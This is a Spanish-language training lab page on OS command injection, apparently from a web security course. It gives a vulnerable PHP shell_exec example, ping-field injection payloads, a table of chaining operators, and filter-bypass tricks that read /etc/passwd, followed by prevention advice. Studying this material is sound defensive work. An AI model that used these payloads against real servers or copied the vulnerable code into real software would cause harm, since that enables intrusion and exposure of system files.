---
title: "Lab - OS Command Injection"
date: "2026-10-08"
author: "Manuel FR"
tags:
  - ifct0109
  - poc
  - vulnerabilidades-web
  - web
  - vulnweb
  - command-injection
---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]

---
# Lab - OS Command Injection

# 💻 Command Injection

 

## OS Command Injection - Ejecución de Comandos del Sistema

 
 
 

## 📚 ¿Qué es Command Injection?

 

**Command Injection** (también conocido como OS Command Injection) es una vulnerabilidad que permite a un atacante ejecutar comandos arbitrarios del sistema operativo en el servidor que está ejecutando la aplicación vulnerable.
 
 

Esta vulnerabilidad surge cuando una aplicación web:
 

 
* Toma entrada del usuario sin validación adecuada
 
* Pasa esa entrada directamente a funciones del sistema que ejecutan comandos
 
* No sanitiza caracteres especiales que permiten encadenar comandos
 

 

> [!note]
> 
 **⚠️ Impacto:** Command Injection es una de las vulnerabilidades más críticas, ya que permite a un atacante ejecutar comandos del sistema operativo, pudiendo comprometer completamente el servidor.
> 

 

 
 
 

## 🧪 Laboratorios Prácticos

 

Completa estos laboratorios progresivos para dominar la explotación de Command Injection:

 
 
 
 

### Lab 1: Command Injection Básico

 FÁCIL
 
 
 

 Este laboratorio contiene una vulnerabilidad de command injection en la funcionalidad de verificación de ping. La aplicación ejecuta directamente comandos del sistema con entrada del usuario sin ninguna validación.
 
 
 
 **🎯 Objetivo:** Leer el contenido del archivo /secret.txt y obtener la FLAG.
 
 
 
 🚀 Acceder al Laboratorio
 
 
 
 
 💡 Ver Solución
 ▼
 
 
 

#### Solución Paso a Paso:

 

 
1. Accede al laboratorio y encuentra el formulario de verificación de ping
 
2. Prueba con una IP normal como `127.0.0.1` para ver el comportamiento
 
3. Intercepta la petición con Burp Suite o modifica directamente el input
 
4. Inyecta un comando usando un operador de encadenamiento:
 

 
 

#### Payloads a probar:

 
127.0.0.1; whoami

127.0.0.1 | whoami

127.0.0.1 && whoami

127.0.0.1 || whoami
 
 
 

**Resultado esperado:** La aplicación ejecutará `ping 127.0.0.1` seguido de `whoami`, mostrando el nombre del usuario en la respuesta.
 

**Objetivo:** Una vez encuentres la vulnerabilidad, el objetivo es leer el contenido del archivo /secret.txt

 

> [!note]
> 
 **💡 Concepto clave:** En este laboratorio básico no hay filtros, por lo que cualquier operador de encadenamiento funcionará.
> 

 
 
 

 
 

> [!note]
> 
 
> **🚧 Más laboratorios próximamente...**
> 

 

 
 

## 🔍 ¿Cómo Funciona?

 

Las aplicaciones web a menudo necesitan ejecutar comandos del sistema operativo para realizar tareas como:
 

 
* Verificar disponibilidad de red (`ping`)
 
* Procesar imágenes o archivos
 
* Consultar información del sistema
 
* Interactuar con bases de datos externas
 

 

### Ejemplo Vulnerable en PHP:

 
<?php
$ip = $_GET['ip'];
// VULNERABLE: No hay validación
$output = shell_exec("ping -c 4 ". $ip);
echo "<pre>$output</pre>";
?>
 

 

Si un usuario introduce `8.8.8.8`, la aplicación ejecuta:
 ping -c 4 8.8.8.8

 

Pero si un atacante introduce `8.8.8.8; whoami`, la aplicación ejecuta:
 ping -c 4 8.8.8.8; whoami
 
 

El operador `;` permite encadenar comandos, ejecutando primero `ping` y luego `whoami`.
 

 

## ⚙️ Operadores de Encadenamiento de Comandos

 

Los sistemas Unix/Linux y Windows soportan varios operadores para encadenar comandos:
 
 

### Unix/Linux:

 
 
 
 
 
 
 
 
 
 
 
 
 
 `;`
 `%3b`
 
 `cmd1; cmd2`
 
 
 
 `\n`
 `%0a`
 
 `cmd1%0acmd2`
 
 
 
 `&`
 `%26`
 
 `cmd1 & cmd2`
 
 
 
 `|`
 `%7c`
 
 `cmd1 | cmd2`
 
 
 
 `&&`
 `%26%26`
 
 `cmd1 && cmd2`
 
 
 
 `||`
 `%7c%7c`
 
 `cmd1 || cmd2`
 
 
 
 ``cmd``
 `%60cmd%60`
 
 `echo `whoami``
 
 
 
 `$(cmd)`
 `%24%28cmd%29`
 
 `echo $(whoami)`
 
 
 

| Operador | Carácter | URL Encoded | Descripción | Ejemplo |
| --- | --- | --- | --- | --- |
| Semicolon | | | Ejecuta ambos comandos secuencialmente | |
| New Line | | | Ejecuta ambos comandos en líneas separadas | |
| Background | | | Ejecuta cmd1 en background, cmd2 inmediatamente | |
| Pipe | | | La salida de cmd1 es entrada de cmd2 | |
| AND | | | Ejecuta cmd2 solo si cmd1 tiene éxito | |
| OR | | | Ejecuta cmd2 solo si cmd1 falla | |
| Sub-Shell (backticks) | | | Command substitution (Linux only) | |
| Sub-Shell (dollar) | | | Command substitution (Linux only) | |

 

### Windows:

 

Windows también soporta algunos de estos operadores:
 

 
* `&` (`%26`) - Ejecuta comandos secuencialmente
 
* `&&` (`%26%26`) - Ejecuta cmd2 si cmd1 tiene éxito
 
* `|` (`%7c`) - Pipe: salida de cmd1 a entrada de cmd2
 
* `||` (`%7c%7c`) - Ejecuta cmd2 si cmd1 falla
 

 

> [!note]
> 
 **💡 Tip:** En aplicaciones web, a menudo necesitarás usar los caracteres URL-encoded, especialmente cuando inyectas a través de parámetros GET o cuando el servidor decodifica la entrada antes de procesarla.
> 

 
 

## 🎭 Técnicas de Ofuscación y Bypass

 

Los atacantes utilizan diversas técnicas para evadir filtros y validaciones:

 

### 1. Codificación y Caracteres Especiales

 
# Uso de comillas

w"ho"am"i"

w'h'o'a'm'i

# Concatenación

who$@ami

who${IFS}ami

# Caracteres de escape

who\ami
 

 

### 2. Variables de Entorno y Separadores

 
# IFS (Internal Field Separator)

cat${IFS}/etc/passwd

cat$IFS$9/etc/passwd

# Usando TAB

cat	/etc/passwd
 

 

### 3. Encoding de URL

 
# URL encoding

%3B%20whoami →; whoami

%0A whoami → \n whoami

%7C whoami → | whoami
 

 

### 4. Wildcards y Globbing

 
# Usando comodines

/bin/c?t /etc/passwd

/bin/c*t /etc/passwd

/???/??t /???/??ss??
 

 

### 5. Command Substitution

 
# Backticks

`whoami`

# Dollar parenthesis

$(whoami)

# Dentro de echo

echo $(cat /etc/passwd)
 

 

### 6. Bypass de Filtros de Palabras Clave

 
# Si "whoami" está filtrado:

w'h'o'a'm'i

who$()ami

\whoami

wh${IFS}oami

$(echo whoami)
 
 

 
 

## 🛡️ Prevención de Command Injection

 
 

### 1. Evitar Ejecutar Comandos del Sistema

 

La mejor prevención es **no ejecutar comandos del sistema operativo**. Usa librerías y funciones nativas del lenguaje siempre que sea posible.

 

### 2. Validación Estricta de Entrada

 

 
* Usar listas blancas (whitelist) de valores permitidos
 
* Validar formato y tipo de datos
 
* Rechazar cualquier entrada que contenga caracteres especiales
 

 

### 3. Sanitización de Entrada

 
// PHP: Usar escapeshellarg() y escapeshellcmd()

$safe_ip = escapeshellarg($user_input);

exec("ping -c 4 $safe_ip");

// Python: Usar subprocess con argumentos separados

subprocess.run(['ping', '-c', '4', user_input])
 

 

### 4. Principio de Menor Privilegio

 

 
* Ejecutar la aplicación con el mínimo privilegio necesario
 
* No ejecutar servicios web como root/Administrator
 
* Usar usuarios dedicados con permisos limitados
 

 

### 5. Deshabilitar Funciones Peligrosas

 

En PHP, deshabilitar funciones peligrosas en `php.ini`:
 
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
 
 

 
 

**🛡️ VulnWeb Lab** - Laboratorio de Vulnerabilidades Web
 

© 2025 - Entorno Educativo IFCT0109

---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]
